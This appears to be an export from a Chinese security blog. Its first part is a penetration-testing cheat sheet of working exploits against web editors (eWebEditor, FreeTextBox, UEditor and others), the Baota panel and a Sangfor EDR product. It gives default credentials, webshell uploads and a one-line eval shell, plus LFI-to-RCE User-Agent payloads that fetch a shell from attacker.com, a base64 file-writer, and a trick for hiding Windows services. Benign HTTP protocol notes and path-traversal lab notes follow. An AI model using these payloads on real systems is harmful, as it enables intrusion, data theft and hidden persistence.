admin/admin888 、 admin/admin、 admin/123456 、admin/admin9991、点击“样式管理”—可以选择新增样式，或者修改一个非系统样式，将其中图片控件所允许的上传类型后面加上|asp、|asa、|aaspsp或|cer，只要是服务器允许执行的脚本类型即可，点击“提交”并设置工具栏—将“插入图片”控件添加上。而后—预览此样式，点击插入图片，上传WEBSHELL，在“代码”模式中查看上传文件的路径。
2、当数据库被管理员修改为asp、asa后缀的时候，可以插一句话木马服务端进入数据库，然后一句话木马客户端连接拿下webshell
3、上传后无法执行？目录没权限？帅锅你回去样式管理看你编辑过的那个样式，里面可以自定义上传路径的！！！
4、设置好了上传类型，依然上传不了麽？估计是文件代码被改了，可以尝试设定“远程类型”依照6.0版本拿SHELL的方法来做（详情见下文↓），能够设定自动保存远程文件的类型。
5、不能添加工具栏，但设定好了某样式中的文件类型，怎么办？↓这么办！
(请修改action字段)
Action.html
6、需要突破上传文件类型限制么？Come here! —&gt;&gt; 将图片上传类型修改为“aaspsp;”(不含引号)，将一句话shell文件名改为“1.asp;”(不含引号)并上传即可。—&gt;本条信息来源：微笑刺客
eWebEditor 可下载数据库，但密文解不开
脆弱描述：
当我们下载数据库后查询不到密码MD5的明文时，可以去看看webeditor_style(14)这个样式表，看看是否有前辈入侵过 或许已经赋予了某控件上传脚本的能力，构造地址来上传我们自己的WEBSHELL.
攻击利用:
比如 ID=46 s-name =standard1构造 代码: ewebeditor.asp?id=content&amp;style=standardID和和样式名改过后
ewebeditor.asp?id=46&amp;style=standard1
eWebEditor遍历目录漏洞
脆弱描述：
ewebeditor/admin_uploadfile.asp
admin/upload.asp
过滤不严，造成遍历目录漏洞
攻击利用:
第一种:ewebeditor/admin_uploadfile.asp?id=14
在id=14后面添加&amp;dir=..
再加 &amp;dir=../..
&amp;dir=http://www.xxxx.com/../.. 看到整个网站文件了
第二种: ewebeditor/admin/upload.asp?id=16&amp;d_viewmode=&amp;dir =./..
eWebEditor 5.2 列目录漏洞
脆弱描述：
ewebeditor/asp/browse.asp
过滤不严，造成遍历目录漏洞
攻击利用：
http://www.xxxx.com/ewebeditor/asp/browse.asp?style=standard650&amp;dir=…././/..
利用eWebEditor session欺骗漏洞,进入后台
脆弱描述：
漏洞文件:Admin_Private.asp
只判断了session，没有判断cookies和路径的验证问题。
攻击利用:
新建一个test.asp内容如下:
&lt;%Session(“eWebEditor_User”) = “11111111”%&gt;
访问test.asp，再访问后台任何文件，for example:Admin_Default.asp
eWebEditor asp版 2.1.6 上传漏洞
攻击利用:（请修改action字段为指定网址）
ewebeditor asp版2.1.6上传漏洞利用程序.html
eWebEditor 2.7.0 注入漏洞
攻击利用:
http://www.xxxx.com/ewebeditor/ewebeditor.asp?id=article_content&amp;style=full_v200
默认表名：eWebEditor_System默认列名：sys_UserName、sys_UserPass，然后利用nbsi进行猜解.
eWebEditor2.8.0最终版删除任意文件漏洞
脆弱描述：
此漏洞存在于Example\NewsSystem目录下的delete.asp文件中，这是ewebeditor的测试页面，无须登陆可以直接进入。
攻击利用: (请修改action字段为指定网址)
Del Files.html
eWebEditor PHP/ASP 后台通杀漏洞
影响版本: PHP ≥ 3.0~3.8与asp 2.8版也通用，或许低版本也可以，有待测试。
攻击利用:
进入后台/eWebEditor/admin/login.php,随便输入一个用户和密码,会提示出错了.
这时候你清空浏览器的url,然后输入javascript:alert(document.cookie=”adminuser=”+escape(“admin”));
javascript:alert(document.cookie=”adminpass=”+escape(“admin”));
javascript:alert(document.cookie=”admindj=”+escape(“1”));而后三次回车,清空浏览器的URL,现在输入一些平常访问不到的文件如../ewebeditor/admin/default.php，就会直接进去。
eWebEditor for php任意文件上传漏洞
影响版本:ewebeditor php v3.8 or older version
脆弱描述:
此版本将所有的风格配置信息保存为一个数组$aStyle,在php.ini配置register_global为on的情况下我们可以任意添加自己喜欢的风格，并定义上传类型。
攻击利用:
phpupload.html
eWebEditor JSP版漏洞
大同小异。
eWebEditor 2.8 商业版插一句话木马
影响版本:=&gt;2.8 商业版
攻击利用:
登陆后台，点击修改密码—-新密码设置为 1&quot;:eval request(&quot;h&quot;)’
设置成功后，访问asp/config.asp文件即可，一句话木马被写入到这个文件里面了.注意：可能因为转载的关系，代码会变掉，最好本地调试好代码再提交。
eWebEditorNet upload.aspx 上传漏洞(WebEditorNet)
脆弱描述：
WebEditorNet 主要是一个upload.aspx文件存在上传漏洞。
攻击利用:
默认上传地址：/ewebeditornet/upload.aspx
可以直接上传一个cer的木马
如果不能上传则在浏览器地址栏中输入javascript:lbtnUpload.click();
成功以后查看源代码找到uploadsave查看上传保存地址，默认传到uploadfile这个文件夹里。
</code></pre>
<h3 id="southidceditor-一般使用v2-8-0版eWeb核心"><a href="#southidceditor-一般使用v2-8-0版eWeb核心" class="headerlink" title="southidceditor(一般使用v2.8.0版eWeb核心)"></a>southidceditor(一般使用v2.8.0版eWeb核心)</h3><pre><code>http://www.xxxx.com/admin/southidceditor/datas/southidceditor.mdb
http://www.xxxx.com/admin/southidceditor/admin/admin_login.asp
http://www.xxxx.com/admin/southidceditor/popup.asp
bigcneditor(eWeb 2.7.5 VIP核心)
其实所谓的Bigcneditor就是eWebEditor 2.7.5的VIP用户版.之所以无法访问admin_login.asp，提示“权限不够”4字真言，估计就是因为其授权“Licensed”问题,或许只允许被授权的机器访问后台才对。或许上面    针对eWebEditor v2.8以下低版本的小动作可以用到这上面来.貌似没多少动作Cute Editor
</code></pre>
<h3 id="Cute-Editor在线编辑器本地包含漏洞"><a href="#Cute-Editor在线编辑器本地包含漏洞" class="headerlink" title="Cute Editor在线编辑器本地包含漏洞"></a>Cute Editor在线编辑器本地包含漏洞</h3><pre><code>影响版本:
CuteEditor For Net 6.4
脆弱描述：
可以随意查看网站文件内容，危害较大。
攻击利用:
http://www.xxxx.com/CuteSoft_Client/CuteEditor/Load.ashx?type=image&amp;file=../../../web.config
Cute Editor Asp.Net版利用iis解析漏洞获得权限
影响版本：
CuteEditor for ASP.NET中文版脆弱描述：
脆弱描述：
CuteEditor对上传文件名未重命名，导致其可利用IIS文件名解析Bug获得webshell权限。
攻击利用：
可通过在搜索引擎中键入关键字 inurl:Post.aspx?SmallClassID= 来找到测试目标。
在编辑器中点击“多媒体插入”，上传一个名为“xxx.asp;.avi”的网马，以此获得权限。
</code></pre>
<h3 id="Webhtmleditor"><a href="#Webhtmleditor" class="headerlink" title="Webhtmleditor"></a>Webhtmleditor</h3><pre><code>利用WIN 2003 IIS文件名称解析漏洞获得SHELL
影响版本：&lt;= Webhtmleditor最终版1.7 (已停止更新)
脆弱描述/攻击利用：
对上传的图片或其他文件无重命名操作，导致允许恶意用户上传diy.asp;.jpg来绕过对后缀名审查的限制，对于此类因编辑器作者意识犯下的错误，就算遭遇缩略图，文件头检测，也可使用图片木马 插入一句话来突破。
</code></pre>
<h3 id="Kindeditor"><a href="#Kindeditor" class="headerlink" title="Kindeditor"></a>Kindeditor</h3><pre><code>利用WIN 2003 IIS文件名称解析漏洞获得SHELL
影响版本: &lt;= kindeditor 3.2.1(09年8月份发布的最新版)
脆弱描述/攻击利用：
拿官方做个演示：进入http://www.xxxx.com/ke/examples/index.html 随意点击一个demo后点图片上传，某君上传了如下文件：http://www.xxxx.com/ke/attached/test.asp;.jpg
Note:参见附录C原理解析。
</code></pre>
<h3 id="Freetextbox"><a href="#Freetextbox" class="headerlink" title="Freetextbox"></a>Freetextbox</h3><pre><code>Freetextbox遍历目录漏洞
影响版本：未知
脆弱描述：
因为ftb.imagegallery.aspx代码中 只过滤了/但是没有过滤\符号所以导致出现了遍历目录的问题。
攻击利用:
在编辑器页面点图片会弹出一个框（抓包得到此地址）构造如下，可遍历目录。
http://www.xxxx.com/Member/images/ftb/HelperScripts/ftb.imagegallery.aspx?frame=1&amp;rif=..&amp;cif=\..
Freetextbox Asp.Net版利用IIS解析漏洞获得权限
影响版本：所有版本
脆弱描述：
没做登陆验证可以直接访问上传木马
Freetextbox 3-3-1 可以直接上传任意格式的文件
Freetextbox 1.6.3 及其他版本可以上传 格式为x.asp;.jpg
攻击利用：
利用IIS解析漏洞拿SHELL。上传后SHELL的路径为http://www.xxxx.com/images/x.asp;.jpg
</code></pre>
<h3 id="Msn-editor"><a href="#Msn-editor" class="headerlink" title="Msn editor"></a>Msn editor</h3><pre><code>利用WIN 2003 IIS文件名称解析漏洞获得SHELL
影响版本：未知
脆弱描述：
点击图片上传后会出现上传页面，地址为
http://www.xxxx.com/admin/uploadPic.asp?language=&amp;editImageNum=0&amp;editRemNum=
用普通的图片上传后，地址为
http://www.xxxx.com/news/uppic/41513102009204012_1.gif
记住这时候的路径，再点击图片的上传，这时候地址就变成了
http://www.xxxx.com/news/admin/uploadPic.asp?language=&amp;editImageNum=1&amp;editRemNum=41513102009204012
很明显。图片的地址是根据RemNum后面的编号生成的。
攻击利用:
配合IIS的解析漏洞，把RemNum后面的数据修改为1.asp;41513102009204012，变成下面这个地址
http://www.xxxx.com/admin/uploadPic.asp?language=&amp;editImageNum=0&amp;editRemNum=1.asp;41513102009204012
然后在浏览器里打开，然后选择你的脚本木马上传，将会返回下面的地址
uppic/1.asp;41513102009204012_2.gif
直接打开是小马地址！
</code></pre>
<h3 id="Ueditor"><a href="#Ueditor" class="headerlink" title="Ueditor"></a>Ueditor</h3><pre><code>1.4.3.3 .net版本
&lt;form action=&quot;http://xx.com/ueditor/net/controller.ashx?action=catchimage&quot; enctype=&quot;multipart/form-data&quot; method=&quot;POST&quot;&gt;
&lt;p&gt;shell addr: &lt;input type=&quot;text&quot; name=&quot;source[]&quot; /&gt;&lt;/p&gt;
&lt;input type=&quot;submit&quot; value=&quot;Submit&quot; /&gt;
&lt;/form&gt;
加载一个远程图片shell
表单在远程图片后加?.aspx
如 http://1.1.1.1/uploads/1.gif?.aspx
</code></pre>
<h2 id="宝塔面板未授权访问phpmyadmin"><a href="#宝塔面板未授权访问phpmyadmin" class="headerlink" title="宝塔面板未授权访问phpmyadmin"></a>宝塔面板未授权访问phpmyadmin</h2><pre><code>宝塔Linux面板7.4.2版本
宝塔Linux测试版7.5.13
Windows面板6.8版本
直接访问http://your_ip:888/pma
</code></pre>
<h2 id="深x服"><a href="#深x服" class="headerlink" title="深x服"></a>深x服</h2><pre><code>EDR RCE
https://ip+端口/tool/log/c.php?strip_slashes=system&amp;host=id 即可执行命令
终端检测响应平台任意用户登录
fofa: title=&quot;终端检测响应平台&quot;
target+/ui/login.php?user=admin 即可直接登录
</code></pre>
<h2 id="天r信"><a href="#天r信" class="headerlink" title="天r信"></a>天r信</h2><pre><code>默认用户superman的uid=1
POST /?module-auth_user&amp;action=mod_edit.pwd HTTP/1.1
</code></pre>
<h2 id="从LFI到RCE"><a href="#从LFI到RCE" class="headerlink" title="从LFI到RCE"></a>从LFI到RCE</h2><pre><code>当有个lfi时
https://www.website.com/index.php?pg=../../../../etc/passwd
尝试包含/proc/self/environ
https://www.website.com/index.php?pg=../../../../proc/self/environ
若是存在user-agent标识
修改ua来实现rce:
User-Agent: &lt;?system(&#39;wget http://attacker.com/shell.txt -O shell.php&#39;);?&gt;
User-Agent: &lt;?exec(&#39;wget http://attacker.com/shell.txt -O shell.php&#39;);?&gt;
User-Agent: &lt;?php phpinfo(); ?&gt;
也可以在服务器内部来创建文件写入shell
User-Agent: &lt;?php $a = base64_decode(&#39;PD9waHAgCiAgJGEgPSAkX1BPU1RbJ2NvZGUnXTsKICAkZmlsZSA9IEBmb3BlbigkX1BPU1RbJ2ZpbGUnXSwndycpOwogIEBmd3JpdGUoJGZpbGUsJGEpOwogIEBmY2xvc2UoJGZpbGUpOwo/Pgo8Y2VudGVyPgogIDxmb3JtIG1ldGhvZD0icG9zdCIgaWQ9ImZvcm0iPgogICAgPGgyPkZpbGUgV3JpdGVyPC9oMj4KICAgIEZpbGUgTmFtZTxicj48aW5wdXQgdHlwZT0idGV4dCIgbmFtZT0iZmlsZSIgcGxhY2Vob2xkZXI9InNoZWxsLnBocCI+PGJyPgogICAgU2hlbGwgQ29kZTxicj48dGV4dGFyZWEgbmFtZT0iY29kZSIgZm9ybT0iZm9ybSIgcGxhY2Vob2xkZXI9IlBhc3RlIHlvdXIgc2hlbGwgaGVyZSI+PC90ZXh0YXJlYT48YnI+CiAgICA8aW5wdXQgdHlwZT0ic3VibWl0IiB2YWx1ZT0iV3JpdGUiPgogIDwvZm9ybT4KPC9jZW50ZXI+Cg==&#39;); $file = fopen(&#39;shell.php&#39;,&#39;w&#39;); echo fwrite($file,$a); fclose($file); ?&gt;
</code></pre>
<h2 id="隐藏windows服务"><a href="#隐藏windows服务" class="headerlink" title="隐藏windows服务"></a>隐藏windows服务</h2><pre><code>Translate from: https://www.sans.org/blog/red-team-tactics-hiding-windows-services/
Windows的一个功能允许红队或攻击者将服务隐藏起来，从而为逃避基于主机的常见威胁搜寻技术的检测提供了机会。
这里假设Fax服务是我们的恶意文件或后门
打开services.msc可以看到服务
</code></pre>
<p><img src="849.png" alt="image"></p>
<pre><code>执行命令可以看到服务
</code></pre>
<p><img src="850.png" alt="image"></p>
<pre><code>管理员权限下执行以下命令，安全标识符定义语言(SDDL)
</code></pre>
<p><img src="851.png" alt="image"></p>
<pre><code>&amp; $env:SystemRoot\System32\sc.exe sdset SWCUEngine &quot;D:(D;;DCLCWPDTSD;;;IU)(D;;DCLCWPDTSD;;;SU)(D;;DCLCWPDTSD;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)&quot;
</code></pre>
<p><img src="852.png" alt="image"></p>
<pre><code>可以看到已经查询不到了
</code></pre>
<p><img src="853.png" alt="image"></p>
<pre><code>在红队或渗透测试中，这可能是一种有用的技术，可以在受感染主机上保持持久性。重启后，隐藏的服务也会自动启动。
取消隐藏的命令
&amp; $env:SystemRoot\System32\sc.exe sdset SWCUEngine &quot;D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)&quot;
</code></pre>
]]></content>
  </entry>
  <entry>
    <title>htttp协议部分笔记</title>
    <url>/2020/02/05/htttp%E5%8D%8F%E8%AE%AE%E9%83%A8%E5%88%86%E7%AC%94%E8%AE%B0-This-is-Y/</url>
    <content><![CDATA[<p>来自之前cnblog的博客<br><a class="link" href="https://www.cnblogs.com/This-is-Y/p/12256079.html">源地址：https://www.cnblogs.com/This-is-Y/p/12256079.html<i class="fas fa-external-link-alt"></i></a></p>
<p>**报文：　**　</p>
<p><strong>http请求报文：</strong></p>
<p>基本格式</p>
<p>　　<img src="1503868-20200205111708601-107755887.png" alt width="651" height="271"></p>
<p> 请求行：这里那有道翻译的网页用一下（应该没啥关系吧）</p>
<p>　　<img src="1503868-20200205155437106-1447717939.png" alt></p>
<p> 　　请求行由3部分组成，请求方法，请求URL，HTTP协议版本。</p>
<p>　　　　<strong>方法</strong>：最常见的有GET，POST，请求方法一定是要大写　　　　　　</p>
<p>HTTP/1.0和HTTP/1.1支持的方法：</p>
<img src="1503868-20200203143502218-550940739.png" alt width="598" height="308">

<p> 但因为安全隐患等原因，用的最多的还是POST和GET，关于POST和GET：<a class="link" href="https://www.cnblogs.com/This-is-Y/p/12244175.html">https://www.cnblogs.com/This-is-Y/p/12244175.html<i class="fas fa-external-link-alt"></i></a></p>
<p>　　　　　　 <strong>URL</strong>：URI（Uniform Resource Identifier）：统一资源标识符</p>
<p>URL（Uniform Resource Locator）：统一资源定位符</p>
<p>URL是URI的子集，URL是一种具体的URI。</p>
<p>较为经典的URI</p>
<img src="1503868-20200203134002377-1332556046.png" alt width="559" height="114">

<p>协议有http，https，ftp 等</p>
<p>登陆认证信息一般出现得较少</p>
<p>　　　　　　<strong>协议版本：</strong>最初的版本HTTP/0.9，然后是HTTP/1.0，再之后是将持久连接改为默认的HTTP/1.1，这是最主流的HTTP协议版本。再到现在的的HTTP/2.0，这个用的不多。</p>
<p> </p>
<p><strong>http响应报文：</strong></p>
<p>基本格式</p>
<img src="1503868-20200203135421531-427205203.png" alt width="577" height="369">

<p><strong>响应码：</strong> 有2xx，3xx，4xx，5xx这几大类，其中1xx表示信息性状态码，接受的请求正在处理。2xx表示成功，请求正常处理完毕。3xx多表示重定向，需要进行附加操作完成请求。4xx多表示失败（客户端），服务器无法处理请求。5xx同样表示失败（服务端），服务器处理请求出错。</p>
<p>1xx：有100  Continue，表示继续。101  Switching Protocol，切换协议。1xx响应码很少见，</p>
<p>2xx：最常见的是200  OK，表示请求正常处理。  204  No Content 没有内容，一般在需要客户端发送信息而服务端不需要返回<strong>新</strong>信息内容时出现（一般在一个网页按F5刷新，看似什么都没有发生，实际上浏览器发送了请求，而此时响应码就是204）。  206 Partial Content 请求并发送部分内容，一般出现在发送内容过大时，在首部字段中使用range头对文件进行分块发送（当浏览一些较大的图片，PDF时会出现）</p>
<p>3xx：301 Moved Permanently 永久移动，即重定向，当前全球的资源分配了新的URI（可以在首部字段中找到Location字段找到新的URI）。302 Found 临时移动 ，在防火墙认证时经常用到。与302一起出现的还有  303 See Other 查看其他位置 ，在302跳转认证成功了，就会出现303 see other，这个表示由于请求对应的资源存在另一个URI，应使用GET方法定向获取请求的资源（303状态码明确表示用户应该使用GET方法获取资源。）304 Not Modified 未修改，告诉客户端,所请求的内容距离上次访问并没有变化. 客户端可以直接从浏览器缓存里获取该资源（304是3xx里面和重定向没关系的一个）。307  Temporary Redirect  临时重定向 ，和302类似，但307更为严谨，不会从POST变成GET，302尽管禁止POST变换成GET，但是大多数人并不遵守。关于重定向，还有一个META Redirect，只需要在html的head里写上&lt;meta http-equiv=”refresh” content=”5;URL=新的URL”&gt;  content里面的5代表延迟时间5s，这样操作返回的响应码是200 OK<br>4xx：400 Bad Request 错误请求，发送的URL有错误，比如无法正确转码什么的。401 Unauthorized 未认证，在打开一个网页时弹出窗口需要你认证身份。403 Forbidden 禁止访问  ,权限不足，无法访问请求的文件。404 Not Found 喜闻乐见的一个状态码，这个不需要多说了，访问文件不存在。<br>5xx：500 Internal Server Error  内部服务器错误，一般是阿帕奇服务器出现问题。503 Service Unavailable 服务不可用，服务器出现超负载或者正在停机维护。</p>
<p>　　这里我只说一小部分响应码，响应码总结大全：<a class="link" href="https://www.cnblogs.com/isykw/p/6115469.html">https://www.cnblogs.com/isykw/p/6115469.html<i class="fas fa-external-link-alt"></i></a> 。</p>
<p> </p>
<p>首部字段细分：<br>　　 通用首部字段：在请求报文和响应报文中都可能出现</p>
<p>请求首部字段：只在请求报文中出现</p>
<p>响应首部字段：只在响应报文中出现</p>
<p>实体首部字段：和实际传输数据相关的参数。</p>
<p>其他</p>
<p> </p>
<p><strong>通用首部字段：</strong></p>
<img src="1503868-20200205130853547-1458158193.png" alt width="658" height="411">

<p>　　Cache-Control：缓存控制，是否使用缓存</p>
<p>　　Connection：持久连接，后文有详细提到，有Keep-Alive ，close等值</p>
<p>　　Keep-Alive：控制连接断开条件，timeout（超时时间），max请求次数极大值</p>
<p>　　Date：HTTP报文产生日期</p>
<p>　　Transfer-Encoding：传输报文主体采用的编码方式，chunked（分段式编码）</p>
<p>　　Upgrade：检测协议或是否可以使用更高版本协议进行通信（不太懂）</p>
<p>　　Warning：警告。[警告码][警告主机：端口号][警告内容]（[警告时间]（可省略））</p>
<p><strong>请求首部字段：</strong></p>
<p>　　　　<img src="1503868-20200205135524987-1420334523.png" alt></p>
<p> </p>
<p> </p>
<p>　　　　Accept：告知服务器用户代理能够处理的媒体类型及媒体类型的相对优先级 ，如text/plain;q=0.3,text/htm;q=0.4,  不同的文件类型用 ‘ , ‘  分隔，q的值未权重，0~1，可精确到小数点后3位，默认值位1.0。服务器提供多种内容时，优先返回权重值高的媒体类型。</p>
<p>　　　　　　　　文本文件：text/html，text/plain，text/css……</p>
<p>　　　　　　　　　　　　　application/xml，application/xhtml+xml……</p>
<p>　　　　　　　　图片文件：image/jpeg，image/gif，image/png……</p>
<p>　　　　　　　　视频文件：video/mpeg，video/quicktime……</p>
<p>　　　　　　　　应用程序使用的二进制文件：application/octet-stream，application/zip……</p>
<p>   　　　Accept-Charset：可接受的字符集，像utf-8等。同样有优先级</p>
<p>　　　　Accept-Encoding：告知服务器用户代理支持的内容编码以及内容编码的优先级，gzip，deflate等</p>
<p>　　　　　　　　gzip：由文件压缩程序gzip（GNU zip）生成的编码格式（RFC1952）</p>
<p>　　　　　　　　compress：由UNIX压缩程序compress生成的编码格式</p>
<p>　　　　　　　　deflate：组合使用zlib格式（RFC1950）及由deflate压缩算法（RFC951）生成的编码格式</p>
<p>　　　　　　　　identity：不执行亚索或不会变化的默认编码格式</p>
<p>　　　　Accept-Language：告知服务器用户代理能够处理的自然语言集（指中文或英文等），如zh/cn,zh;q=0.9,en-us;q=0.6，同样有优先级</p>
<p>　　　　Authorization：告知服务器用户的认证信息（证书值），出现401响应码时会出现这个字段</p>
<p>　　　　Host：告知服务器请求的资源所处的互联网主机名和端口号，Host是HTTP/1.1规范内唯一一个必须被包含在请求内的首部字段。Host和以单台服务器分配多个域名的虚拟主机的工作机制有密切的关系</p>
<p>　　　　Referer：告知服务器请求的原始资源的URI。相当于告诉服务器我是从哪里过来的，可用于防止盗链，同时有一定安全隐患。Referer的中文意思是推荐人。</p>
<p>　　　　User-Agent：发送创建请求的浏览器，系统，IP和用户代理名称等信息给服务器，检查User-Agent是一种最简单的反爬手段，与之对应的可以通过fake-useragent库来反反爬。同时也可以使用burpsuite来修改User-Agent。</p>
<p>　　　<strong>响应首部字段：</strong></p>
<p>**　　　　<img src="1503868-20200205154342421-1762077444.png" alt width="611" height="380">**</p>
<p>　　　　Location：出现重定向时，告知客户端新的URL　</p>
<p> </p>
<p> 　　　   Server：告知客户端当前服务器上安装的HTTP服务器应用程序的信息，有安全隐患，会暴露apache服务器，openssl，PHP的版本和操作系统等信息。可通过以下方法解决</p>
<p>　　　　　<img src="1503868-20200205155053585-767915234.png" alt width="510" height="84"></p>
<p> </p>
<p> </p>
<p> 　　　　WWW-Authorizate：和401有关，告知客户端需要做认证</p>
<p>　　　<strong>实体首部字段：</strong></p>
<p>**　　　　<img src="1503868-20200205160107818-1373089464.png" alt width="527" height="369">**</p>
<p> </p>
<p> </p>
<p> 　　　　Content-Length：实体主体部分的大小（以字节为单位）</p>
<p>　　　　 Content-Type：表示报文主体对象类型，常见的是text/html </p>
<p>　　　　 Allow：用于通知客户端获取指定资源可使用的所有HTTP方法，当接收到不支持的方法时，会返回405 Method Not Allowed。同时，还会把所有能支持的HTTP方法写入Allow字段后返回　</p>
<p>　　　　 Content-Encoding：告知客户端服务器对实体的主体部分的编码方式（如gzip等）</p>
<p>　　　　 Content-Language：告知客户端服务器发送的实体主体使用的自然语言</p>
<p>　　　　 Content-Location：表示报文主题返回资源对应的URI。比如访问一个英文页面，但是请求Accept-Language要求的是中文，就返回一个中文页面给客户端，返回的这个中文页面的URL，就在Content-Location字段里（暂时没找到合适的例子，找到了，我记得的话就补充一下）</p>
<p>　　　　 Content-Type：说明了实体主体内对象的媒体类型，和Accept一样，用type/subtype的形式赋值。防火墙限制下载部分类型文件，就是从这里找数据</p>
<p>　　　　 Expires：缓存的存活时间</p>
<p><strong>其他：</strong></p>
<p>**　　**为cookie服务的字段：</p>
<p>　　　　set-cookie：参数（值，存活时间（expires），路径（path），域名（domain），（secure），（HttpOnly））</p>
<p>　　　　　　值：就是cookie的值。</p>
<p>　　　　　　expires：cookis可以使用多长时间</p>
<p>　　　　　　domain：假如设置域名为  .thisisy.com 那么该cookie可以发给<a class="link" href="http://www.thisisy.com,也可以发给mail.thisisy.com等等,存在安全隐患,建议不要设置/">www.thisisy.com,也可以发给mail.thisisy.com等等，存在安全隐患，建议不要设置<i class="fas fa-external-link-alt"></i></a></p>
<p>　　　　　　path：和域名原理一样，也是建议不要设置（关于path和domain的详解，看这里：<a class="link" href="https://www.jb51.net/article/44561.htm">https://www.jb51.net/article/44561.htm<i class="fas fa-external-link-alt"></i></a>）</p>
<p>　　　　　　secure：设置该参数，则该cookie只能在建立HTTPS的安全连接下才可以发送cookie</p>
<p>　　　　　　HttpOnly：使js脚本无法获得cookie，主要用于防止xss攻击对cookie的窃取</p>
<p> 同样，首部字段与主体之间要留有空行，主体就是网页html源码</p>
<p> </p>
<p>http是不保存状态的协议，即<strong>无状态协议</strong>，http协议不对请求和响应之间的通信状态做保存，也就是说，在http这个级别，协议对于已经发送过的请求或响应都不做持久化处理。只是为了<strong>更快的处理大量事物</strong>，确保协议的可伸缩性，而特意把http协议设计得如此简单。而有些时候需要对请求或响应做保存，这时候就出现了隐含参数和cookie</p>
<p> </p>
<p><strong>哑服务：</strong></p>
<p>关于http协议的瞬时性，原始版本http都是建立建立，发送请求，接受响应，连接断开。这样一个过程。但是这个过程在大型网页中非常消耗资源（大量资源都用在了建立三次握手上）。</p>
<img src="1503868-20200203144646291-544286251.png" alt>

<p>后来提出了持久连接，只要任意一端没有提出断开连接，连接就会一直存在。在http/1.0中，默认关闭，需要在http头中加入”Connection:Keep-Alive”开启持久连接，在http/1.1中，持久连接变成默认开启，在http头中加入”Connection:close”才会关闭。于是整个过程就变成了建立连接，发送请求，接受响应，发送请求，接受响应…………直到断开连接，就像一个人坐一趟列车在两个地方来回走，必须到达A城才可以去B城，到了B城才能再回A城，</p>
<img src="1503868-20200203144608207-1697778574.png" alt>

<p>但是人们发现这样还不够快，于是出现了管道化，在前面持久连接的基础上，发送一次请求后，不等接受响应，直接发送第二个请求，就像两根管子，分别处理发送的请求与接受的响应</p>
<img src="1503868-20200203144452571-280682539.png" alt>

<p><strong>cookie：</strong></p>
<p>**　　**Cookie是一段不超过4KB的小型文本数据，由一个名称（Name）、一个值（Value）和其它几个用于控制Cookie有效期、安全性、使用范围的可选属性组成。</p>
<p> </p>
<p>由于HTTP是一种无状态的协议，服务器单从网络连接上无从知道客户身份。怎么办呢？就给客户端们颁发一个通行证吧，每人一个，无论谁访问都必须携带自己通行证。这样服务器就能从通行证上确认客户身份了。这就是Cookie的工作原理。（如果盗取了别人的cookie，就可以用别人的身份登陆一些网站，当然，有些网站还会有别的认证方式，但这种安全隐患还是值得注意）</p>
<p> </p>
<p>（图片来源：乾颐堂）</p>
]]></content>
      <categories>
        <category>cnblogs</category>
      </categories>
  </entry>
  <entry>
    <title>iwebsec学习笔记</title>
    <url>/2021/01/17/iwebsec%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-This-is-Y/</url>
    <content><![CDATA[<p>来自之前cnblog的博客<br><a class="link" href="https://www.cnblogs.com/This-is-Y/p/13435718.html">源地址：https://www.cnblogs.com/This-is-Y/p/13435718.html<i class="fas fa-external-link-alt"></i></a></p>
<p><strong>file=php://filter/read=convert.base64-encode/resource=index.php<br><br>SQL注入</strong></p>
<p> 留坑</p>
<p><strong>文件上传</strong></p>
<p> 留坑</p>
<p><strong>文件包含</strong></p>
<p> 1、<a href="http://xx:xx:xx:xx:xx/fi/01.php">http://xx:xx:xx:xx:xx/fi/01.php</a></p>
<p><a href="http://xx:xx:xx:xx:xx/fi/01.php?filename=../../../../etc/passwd">http://xx:xx:xx:xx:xx/fi/01.php?filename=../../../../etc/passwd</a></p>
<img src="1503868-20200906145155823-157903361.png" width="1000" loading="lazy">

<p> </p>
<p>用../不断返回上一层，然后重新打开敏感文件</p>
<p>Linux/Unix系统：<br><br>    /etc/passwd // 账户信息<br><br>    /etc/shadow // 账户密码文件<br><br>    /usr/local/app/apache2/conf/httpd.conf // Apache2默认配置文件<br><br>    /usr/local/app/apache2/conf/extra/httpd-vhost.conf // 虚拟网站配置<br><br>    /usr/local/app/php5/lib/php.ini // PHP相关配置<br><br>    /etc/httpd/conf/httpd.conf // Apache配置文件<br><br>    /etc/my.conf // mysql 配置文件<br><br></p>
<p>Windows系统：<br><br>    c:\boot.ini // 查看系统版本<br><br>    c:\windows\system32\inetsrv\MetaBase.xml // IIS配置文件<br><br>    c:\windows\repair\sam // 存储Windows系统初次安装的密码<br><br>    c:\ProgramFiles\mysql\my.ini // MySQL配置<br><br>    c:\ProgramFiles\mysql\data\mysql\user.MYD // MySQL root密码<br><br>    c:\windows\php.ini // php 配置信息<br>还可以参考：<a class="link" href="https://blog.csdn.net/doulicau/article/details/106683724">https://blog.csdn.net/doulicau/article/details/106683724<i class="fas fa-external-link-alt"></i></a>　</p>
<p>灵活使用</p>
<p>2、<a href="http://xx:xx:xx:xx:xx/fi/02.php">http://xx:xx:xx:xx:xx/fi/02.php</a></p>
<p>（1）：%00截断</p>
<p>条件：magic_quotes_gpc = Off php版本&lt;5.3.4）</p>
<p><a href="http://xx:xx:xx:xx:xx/fi/02.php?filename=../../../../etc/passwd%00">http://xx:xx:xx:xx:xx/fi/02.php?filename=../../../../etc/passwd%00</a></p>
<p>同时放上一些其他的截断方法</p>
<p>（2）路径长度截断</p>
<p>条件：windows OS，点号需要长于256；linux OS 长于4096</p>
<p>EXP</p>
<p>（3）点号截断</p>
<p>条件：windows OS，点号需要长于256</p>
<p>EXP</p>
<p>参考自：<a class="link" href="https://blog.csdn.net/Vansnc/article/details/82528395">https://blog.csdn.net/Vansnc/article/details/82528395<i class="fas fa-external-link-alt"></i></a></p>
<p> </p>
<p> </p>
<p> 3、<a href="http://xx.xx.xx.xx:xx/fi/03.php">http://xx.xx.xx.xx:xx/fi/03.php</a></p>
<p>session本地文件包含</p>
<p>前提需要一个本地文件包含，比如iwebsec中的前面两个</p>
